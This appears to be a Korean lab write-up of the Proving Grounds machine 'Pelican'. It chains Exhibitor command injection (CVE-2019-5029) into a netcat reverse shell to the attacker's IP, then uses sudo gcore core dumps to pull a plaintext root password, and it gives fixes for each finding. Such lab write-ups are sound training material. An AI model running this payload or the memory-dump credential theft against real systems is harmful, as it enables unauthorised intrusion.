---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/cmd-injection
  - tech/payload/revshell
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.115.98
ports: [22, 139, 445, 631, 2181, 2222, 8080, 8081, 39605]
services: [http, ipp, java-rmi, netbios-ssn, ssh, zookeeper]
cves: [CVE-2019-5029]
status: solved
manual_tags: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.115.98` · 호스트명 `pelican` · Debian 10(커널 `4.19.0-10-amd64`, 코어 덤프로 확정) · Intermediate · 플래그 2개
> 진입점: 8081 nginx 리다이렉트가 알려준 Exhibitor(ZooKeeper 관리 UI, 인증 없음) → Config 탭 `java.env script` 필드 명령 주입(CVE-2019-5029) → `charles` 리버스셸
> 권한상승: `sudo -l`에 `NOPASSWD: /usr/bin/gcore` → root 프로세스 `/usr/bin/password-store` 코어 덤프 → `strings`로 평문 root 패스워드 회수
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.115.98

### Initial Access – Exhibitor 관리 UI 무인증 노출과 설정 필드 명령 주입으로 ZooKeeper 프로세스 소유자 권한 획득

**Vulnerability Explanation:**
- Netflix Exhibitor(ZooKeeper 감독 + 웹 UI)가 인증 기능 없이 8080(직접)·8081(nginx 프록시 경유)로 노출됨. Exhibitor 자체가 인증 기능을 갖고 있지 않음
- Config 탭 `java.env script` 필드 값이 검증·이스케이프 없이 ZooKeeper 기동 스크립트에 삽입돼 셸에서 평가됨 — `$( )`·백틱이 명령 치환으로 확장(CWE-78, CVE-2019-5029)
- Exhibitor가 ZooKeeper를 기동하는 주체이므로 "설정 편집 권한 = 코드 실행 권한"인 구조. 얻는 권한은 root 가 아니라 Exhibitor 프로세스 소유자(`charles`)

**Vulnerability Fix:**
- Exhibitor UI를 인터넷/내부망에 직접 노출 금지 — 앞단 리버스 프록시에 인증을 걸거나 관리망 전용 바인딩(`127.0.0.1` + SSH 터널)
- soabase/exhibitor 저장소는 아카이브 상태이고 마지막 릴리스 `1.7.1`이 이미 영향 범위(1.0.9~1.7.1) 안이라 **패치 업그레이드가 조치가 될 수 없음** — 대체 제품 이전 또는 UI 완전 차단이 유일한 완화
- `java.env` 처럼 셸에서 평가되는 설정 필드는 관리자 전용 + 감사 로그 + 변경 승인 필요

**Severity:** Critical — 무인증 원격 명령 실행(CVSS 3.0 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8, Cisco Talos TALOS-2019-0790)

**Steps to reproduce the attack:**
1. `-p-` 전수 nmap 스캔으로 8081(nginx)·8080(Jetty 내장 Exhibitor) 확인 — `http-title` NSE 가 8081의 리다이렉트 목적지 `/exhibitor/v1/ui/index.html` 를 그대로 노출
2. `http://192.168.115.98:8080/exhibitor/v1/ui/index.html` 접근 — 로그인 없이 관리 콘솔 진입
3. Config 탭 `Editing` ON → `java.env script` 필드의 기존 `export JAVA_OPTS="-Xms1000m -Xmx1000m"s` 줄 **아래에** `$(/bin/nc -e /bin/sh 192.168.45.179 4444 &)` 를 덧붙이고 Commit(기존 줄을 지울 필요 없음)
4. ZooKeeper 재기동 트리거 시 필드값이 셸에서 평가돼 리버스셸 연결(`charles` 권한)

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.115.98 | TCP: 22, 139, 445, 631, 2181, 2222, 8080, 8081, 39605 |

```bash
┌──(kali㉿kali)-[~/PG/Pelican]
└─$ nnmap 192.168.115.98
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 10:30 +0900
Nmap scan report for 192.168.115.98
Host is up (0.067s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html
39605/tcp open  java-rmi    Java RMI
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-06-14T21:31:07-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-06-15T01:31:07
|_  start_date: N/A

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   66.84 ms 192.168.45.1
2   66.79 ms 192.168.45.254
3   66.94 ms 192.168.251.1
4   67.10 ms 192.168.115.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.40 seconds
```
— 출처: 화면 출력. `nnmap` 은 `~/.zshrc` 별칭 `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log` 임. 같은 실행이 남긴 파일이 `~/PG/Pelican/nmap.log`(2868B) 이고 본문은 동일 — 파일 쪽은 `-oN` 형식이라 첫 줄이 `# Nmap 7.98 scan initiated Mon Jun 15 10:30:34 2026 as: /usr/lib/nmap/nmap --privileged …`, 끝 줄이 `# Nmap done at Mon Jun 15 10:31:13 2026 …` 로 다름.

`-p-` 필수 — 정답 경로 8081과 대안 39605(JMX)가 top-1000 밖. 8081 의 `http-title: Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html` 한 줄이 진입 URL을 통째로 알려줌(제품명 `exhibitor` 포함).

**버전 판정 — 독립 근거 2개.** nmap `OS details: Linux 5.0 - 5.14` 는 이 박스에서 실측으로 반증됨 — 코어 덤프의 `strings` 출력에 커널이 그대로 찍힘:
```text
LINUX_2.6
Linux
4.19.0-10-amd64
```
— 출처: `Privilege Escalation` 절의 코어 덤프 `strings` 결과

실제 커널은 `4.19.0-10-amd64`(Debian 10 buster). nmap 배너 추측과 셸 획득 후 실측이 어긋난 사례 — [[Sorcerer]]도 동일한 `OpenSSH 7.9p1 Debian 10+deb10u2` 배너에 동일한 OS 추측 오탐이 있었음.

8080의 `Server: Jetty(1.0)` 은 실제 Jetty 릴리스 버전과 무관 — Exhibitor에 내장된 웹서버일 뿐임 [가정]. 제품 정체는 8081의 리다이렉트 경로(`/exhibitor/…`)가 확정.

**Exhibitor UI 접근 — 인증 없음:**

![[Pasted image 20260615104052.png]]
— 출처: `파일보관\Pasted image 20260615104052.png` (10:40:52 · 주입 «전» Config 탭)

8081 접근 시 `http://192.168.115.98:8080/exhibitor/v1/ui/index.html` 로 리다이렉트되고, 로그인 없이 Config 탭에서 `Editing` 토글을 켜 설정 편집이 즉시 가능함. 화면에 드러난 주입 전 상태 — `ZooKeeper Install Dir`=`/opt/zookeeper`, `Snapshot Dir`=`/zookeeper/data`, `Servers`=`1:pelican`, `Additional Config`=`syncLimit=5`/`tickTime=2000`/`initLimit=10`, `java.env script` 원값:

```text
export JAVA_OPTS="-Xms1000m -Xmx1000m"s
```

이 한 줄이 이미 들어 있었음 — 페이로드는 이 줄을 지우지 않고 **아래 줄에 덧붙였다**(주입 후 화면에서 두 줄이 함께 보임).

기타 포트 — CUPS 2.2.10(631), Samba 4.9.5(139/445, 게스트 인증 성공), Java RMI(39605, 셸 획득 후 JMX로 확인). 셋 다 실제 공격에 쓰지 않음 — 미탐색 상세는 [[_PLAYBOOK]] 참조.

### Initial Access – Exhibitor 설정 필드 명령 주입

순수 설정 조작이라 자동 익스플로잇 도구가 필요 없음. 브라우저에서 필드에 문자열을 덧붙이고 Commit 을 누르는 것이 전부 — 검색·PoC 참조는 시험 금지 대상이 아님.

제품·버전 확정 후 익스플로잇 검색(10:41:31):

![[Pasted image 20260615104131.png]]
— 출처: `파일보관\Pasted image 20260615104131.png` (검색어 `zookeeper 3.4 6 1569965 exploit` — nmap 배너 문자열을 그대로 붙여 넣은 형태. 결과 상위에 ZooKeeper 포트 정리 문서와 이 박스의 외부 walkthrough 가 함께 뜸)

**CVE-2019-5029 — 1차 사료:**

| 항목 | 값 |
|---|---|
| CVE / 공지 | CVE-2019-5029 / Cisco Talos TALOS-2019-0790 |
| 분류 | CWE-78 (OS Command Injection) |
| 영향 범위 | Exhibitor Web UI 1.0.9 ~ 1.7.1 |
| 취약 필드 | Config 탭 `java.env script` |

> Arbitrary shell commands surrounded by **backticks or `$()`** can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper.
— Talos TALOS-2019-0790 원문

페이로드 주입 전에 리스너를 먼저 띄움 — 실제로 친 명령은 `rlwrap nc -lnvp 4444`(RCE 캡처 첫 줄에 그대로 남아 있음).

Config 탭에서 `Editing` ON, `java.env script` 필드에 페이로드 한 줄 추가:

```text
$(/bin/nc -e /bin/sh 192.168.45.179 4444 &)
```

| 조각 | 역할 |
|---|---|
| `$( … )` | 명령 치환 — 백틱도 동일하게 동작(Talos 공지가 둘 다 명시) |
| `/bin/nc` | 절대 경로 — 기동 스크립트의 `PATH` 가 제한적일 수 있음 |
| `-e /bin/sh` | 연결 후 `/bin/sh` 를 소켓에 연결. `netcat-openbsd` 에는 `-e` 옵션이 없음 — 이 박스는 `netcat-traditional` 이 깔려 있어 통함(대안은 `mkfifo`·`bash /dev/tcp`) |
| `&` | 백그라운드 실행 — 빠지면 명령 치환이 리버스셸 종료까지 블로킹, ZooKeeper 기동이 멈춰 Exhibitor 가 프로세스를 죽이면 셸도 함께 죽음 |

10:46:46 캡처는 **이 박스의 화면이 아니라 참조한 외부 자료**임 — 브라우저 크롬·주소창이 없는 문서 페이지이고 페이로드의 IP·포트가 `192.168.45.236`·`80` 으로 이 세션 실제값(`192.168.45.179`·`4444`)과 다름. 페이로드 형식과 영향 범위(`1.0.9` ~ `1.7.1`)의 출처로만 인용함:

![[Pasted image 20260615104646.png]]
— 출처: `파일보관\Pasted image 20260615104646.png` (외부 자료 캡처 — 이 박스의 실제 화면 아님)

주입 후 실제 필드 상태(10:46:28 — 시각상 10:46:46 자료 캡처보다 **18초 먼저**임). `Editing` 토글 OFF · `Commit...` 버튼 비활성 = 이미 커밋돼 저장된 상태. `java.env script` 에 원래 있던 `export JAVA_OPTS=…` 줄과 페이로드 줄이 **함께** 보이고 IP `192.168.45.179`·포트 `4444` 로 확인됨:

![[Pasted image 20260615104628.png]]
— 출처: `파일보관\Pasted image 20260615104628.png`

RCE 성공 — `charles` 셸:

```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.179] from (UNKNOWN) [192.168.115.98] 47258

whoami
charles
```

![[Pasted image 20260615104804.png]]
— 출처: `파일보관\Pasted image 20260615104804.png` (10:48:04 · 위 텍스트는 이 캡처를 그대로 옮긴 것)

`nc -e` 로 얻은 셸은 TTY 아님 — `python3 -c 'import pty; pty.spawn("/bin/bash")'` 후 `Ctrl+Z` → `stty raw -echo; fg` → Enter 두 번 → `export TERM=xterm` 으로 업그레이드하는 것이 표준 절차. 이 박스의 원본 산출물에는 업그레이드 명령 자체가 남아 있지 않음(관측 없음) — TTY 미확보 상태에서도 이후 `su` 가 성립한 이유는 권한상승 절 참조([[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]]).

local.txt 는 원본 기록에 텍스트로 남아 있지 않고 스크린샷에만 존재 — 값을 한 글자씩 대조해 옮김:

![[Pasted image 20260615104827.png]]
— 출처: `파일보관\Pasted image 20260615104827.png` (10:48:27 · 화면은 `cat local.txt` 와 값 두 줄뿐 — `whoami`·`hostname` 을 묶은 표준 증거 형식은 아님)

**Local.txt value:**
`e7318ea0ac983323e5625a0d43cbdfb2`

### Privilege Escalation – gcore 코어 덤프로 root 프로세스 메모리에서 평문 자격증명 추출

**Vulnerability Explanation:**
- `charles` 에게 `(ALL) NOPASSWD: /usr/bin/gcore` 위임됨 — 패스워드 없이 임의 사용자 권한으로 임의 PID 의 메모리 전체를 코어 파일로 추출 가능
- root 프로세스 `/usr/bin/password-store` 가 평문 자격증명을 상시 메모리에 들고 무한 `nanosleep` 루프로 대기 — 프로세스 메모리를 읽을 수 있으면 그 프로세스가 아는 모든 비밀을 읽을 수 있음
- `gcore` 는 셸을 주지도 파일을 쓰지도 않지만, "root 프로세스의 메모리를 읽는" 권한만으로 root 데이터를 통째로 탈취 가능 — GTFOBins 부재 항목도 "무엇을 읽고 무엇을 쓰는가"로 스스로 판정해야 함

**Vulnerability Fix:**
- `charles` 의 `NOPASSWD: /usr/bin/gcore` 제거. 디버깅 권한은 root 와 사실상 동등 — 꼭 필요하면 대상 PID 를 특정한 래퍼만 허용하고 `NOPASSWD` 제거
- `/usr/bin/password-store` 설계 자체가 문제 — 비밀은 필요할 때만 메모리에 올리고 즉시 `explicit_bzero()` 로 지울 것. 상시 상주 금지
- `kernel.yama.ptrace_scope=2`(관리자만) 이상으로 설정 — 단 `sudo gcore` 는 root 권한 실행이라 이것만으로는 못 막고 sudo 정책 수정이 우선

**Severity:** Critical — 로컬 저장·상주 평문 자격증명으로 즉시 root 획득

**Steps to reproduce the attack:**
1. `sudo -l` 로 `NOPASSWD: /usr/bin/gcore` 확인
2. `ps -ef --forest` 로 root 소유 커스텀 프로세스(`/usr/bin/password-store`, PID 513) 특정
3. `sudo gcore 513` 으로 코어 덤프 생성
4. `strings core.513 | grep -A2 -B2 -i passw` 로 평문 자격증명 `root:ClogKingpinInning731` 추출
5. `su` 로 root 전환, `/root/proof.txt` 확인

셸 직후 열거:

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/
```

`sudo -l` 결과:

```text
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

`env_reset`(환경변수 초기화 — `LD_PRELOAD` 류 무력화)과 `secure_path`(PATH 하이재킹 무력화) 로 다른 sudo 우회는 막혀 있음. 남는 경로는 `gcore` 뿐.

`ps -ef | grep -i root` 에서 root 소유 프로세스 중 커널 스레드(`[...]`)를 제외하면 둘이 남음:

```text
root       443     1  0 21:27 ?        00:00:00 /usr/sbin/cron -f
root       469   443  0 21:27 ?        00:00:00 /usr/sbin/CRON -f
root       487   469  0 21:27 ?        00:00:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
root       513     1  0 21:27 ?        00:00:00 /usr/bin/password-store
```
— 출처: 셸 세션에서 실행한 `ps -ef | grep -i 'root'` 출력에서 발췌(전문은 커널 스레드 포함 115행). `443 cron → 469 CRON → 487 sh -c while true` 계보가 그대로 보여 `chown` 루프의 기동 주체가 크론임이 확정됨.

PID 487 의 `chown -R` 루프는 권한상승 경로 아님 — GNU `chown -R` 은 기본적으로 심볼릭 링크를 따라가지 않고(`-L`/`-H` 없이는 `-P` 동작), 소유권을 `charles` 로 바꾸는 것이지 root 로 바꾸는 것이 아님. 이 경로는 시도하지 않음 [가정].

PID 513 `/usr/bin/password-store` — 데비안 표준 패키지에 없는 커스텀 root 바이너리. 이름 자체가 표적을 지목.

같은 출력에서 ZooKeeper 프로세스도 잡힘 — 소유자가 `charles` 라 Exhibitor 명령 주입이 `charles` 셸을 주는 것:

```text
charles  10397     1  4 22:00 ?        00:00:00 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /opt/zookeeper/bin/../build/classes:/opt/zookeeper/bin/../build/lib/*.jar:/opt/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/opt/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/opt/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/opt/zookeeper/bin/../lib/log4j-1.2.16.jar:/opt/zookeeper/bin/../lib/jline-0.9.94.jar:/opt/zookeeper/bin/../zookeeper-3.4.6.jar:/opt/zookeeper/bin/../src/java/lib/*.jar:/opt/zookeeper/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
```

`-Dcom.sun.management.jmxremote.local.only=false` 가 nmap 이 본 `39605/tcp java-rmi` 의 정체. `authenticate=false`·`ssl=false` 는 명령줄에 **명시돼 있지 않아** 인증 여부는 미확인 — 대안 경로로 시도하지 않음 [가정].

코어 덤프:

```bash
sudo gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
Saved corefile core.513
[Inferior 1 (process 513) detached]
```

`in __GI___nanosleep` — 덤프 시점에 프로세스가 무한 sleep 루프에 멈춰 있었다는 뜻(`password-store` 는 아무 일도 안 하며 패스워드만 들고 있는 프로세스). `detached` — ptrace 분리 완료, 대상 프로세스는 죽지 않음.

`strings core.513` 전문(134행):

```text
CORE
password-store
/usr/bin/password-store
CORE
x,z=
CORE
/usr/bin/passwor
////////////////
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
N?z=
E?z=
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
P-z=
;*3$"
P.z=
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
P z=
8!z=
P z=
P z=
p&z=
p&z=
p&z=
@&z=
h''z=
0+z=
 +z=
 +z=
@(z=
(+z=
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
////////////////
`,z=
@-z=
@-z=
u##;
 -z=
001 Password: root:
ClogKingpinInning731
E?z=
]?z=
h?z=
u?z=
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
```
— 출처: 셸 세션 기록. `strings` 명령의 별도 텍스트 로그 파일은 관측 없음(`~/PG/Pelican/` 에는 `nmap.log` 만 남아 있음). 자격증명이 찍힌 구간은 스크린샷으로도 남아 있어 값이 이중으로 확인됨:

![[Pasted image 20260615110647.png]]
— 출처: `파일보관\Pasted image 20260615110647.png` (11:06:47 · `@-z=` ~ `h?z=` 8행만 캡처된 발췌 — 전문이 아님)

라벨(`001 Password: root:`)과 값(`ClogKingpinInning731`)이 서로 다른 줄에 있음 — `strings` 는 널 종료 문자열 단위로 끊으므로 `grep passw` 단독으로는 값을 놓침. 같은 덤프에 환경변수(`HOME=/root`)와 커널 버전(`4.19.0-10-amd64`)도 그대로 노출.

root 전환:

```text
su
ClogKingpinInning731
whoami
root
cd /root
cat proof.txt
3da5b5076fd3f0523b94859c757d46f0
```
— 출처: `파일보관\Pasted image 20260615110738.png`

TTY 승격 기록이 없는데 `su` 가 그대로 통과한 것은 이상 현상이 아님 — util-linux `su` 는 TTY 유무와 무관하게 `Password:` 를 내고 stdin 에서 직접 읽음(패스워드를 물을 때 TTY 를 요구해 거부하는 쪽은 `sudo` 이고, 그마저 `-S`·`-A` 로 우회됨). 스크린샷에 패스워드가 평문으로 보이는 것도 TTY 부재의 증거가 아니라 조작자 자신의 로컬 터미널 타이핑 에코일 뿐. 상세 근거는 [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]].

22·2222 두 SSH 포트는 nmap 지문(RSA/ECDSA/ED25519 세 키 전부 동일)상 같은 sshd 인스턴스 — 별개 서비스로 착각해 두 번 공략할 이유 없음.

### Post-Exploitation

**Proof.txt value:**
`3da5b5076fd3f0523b94859c757d46f0`

![[Pasted image 20260615110738.png]]
— 출처: `파일보관\Pasted image 20260615110738.png` (11:07:38 · `su`~`cat proof.txt` 연속 출력. `whoami`→`root` 와 플래그가 한 화면에 있으나 `hostname`·`ip a`·`date` 는 없음 — 표준 증거 형식에는 미달)

**남긴 흔적**
- Exhibitor `java.env script` 필드에 리버스셸 페이로드 커밋 — 원상복구하려면 UI에서 필드를 비우고 재커밋 필요. 지우지 않으면 ZooKeeper 재기동마다 리버스셸 시도가 반복됨
- `core.513`(코어 덤프, `sudo gcore` 실행 디렉터리에 생성) — root 평문 패스워드 포함, 삭제 대상
- `gcore` 가 PID 513 을 detach 했으므로 `password-store` 프로세스는 계속 생존
- 계정 생성 없음. 획득 자격증명 `root` / `ClogKingpinInning731`

## 관련

- Cisco Talos TALOS-2019-0790(CVE-2019-5029 원 공지): https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0790
- soabase/exhibitor(아카이브 상태, 마지막 릴리스 `exhibitor-1.7.1` 2018-07-25): https://github.com/soabase/exhibitor
- 미해결 이슈 #389(2019-04-03 개설, 현재도 열림): https://github.com/soabase/exhibitor/issues/389
- Apache ZooKeeper 관리자 가이드(4자 명령·JMX 설정): https://zookeeper.apache.org/doc/r3.4.6/zookeeperAdmin.html
- GTFOBins `gcore`: https://gtfobins.org/gtfobins/gcore/ · `gdb`: https://gtfobins.org/gtfobins/gdb/
- [[Sorcerer]] — 동일 Debian 10 / 동일 OpenSSH 배너 / 동일 nmap OS 오탐. 이 박스의 코어 덤프가 실제 커널을 `4.19.0-10-amd64` 로 확정해 그 오탐을 반증
- [[Squid]] — Windows 판 같은 사고(`SeDebugPrivilege`/LSASS 덤프 ↔ `sudo gcore`/프로세스 메모리)
- [[Robust]] — 자격증명 저장 위치가 앱 저장소와 다를 수 있다는 같은 패턴(Sticky Notes ↔ 이 박스의 password-store)
- [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]]
- 무인증 관리 콘솔 + 설정 필드 명령주입 계열: [[_PLAYBOOK#B-1-10. ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE]]
- [[_PLAYBOOK#A-1-27. nmap 의 `Did not follow redirect to …` 는 진입 URL 을 통째로 알려준다]] — 8080 의 404 를 8081 의 한 줄이 구한 사례
- [[_PLAYBOOK#B-2-15. 모르는 서비스를 만났을 때의 절차 — ZooKeeper 4자 명령이 그 표본]] — 제품 식별 순서와 15분 손절선
- [[_PLAYBOOK#B-3-15. 코어 덤프에서 평문 자격증명 추출 — `sudo -l` 을 4가지 질문으로 판정하는 법]] — `gcore` 실무 함정과 `strings` 사용법
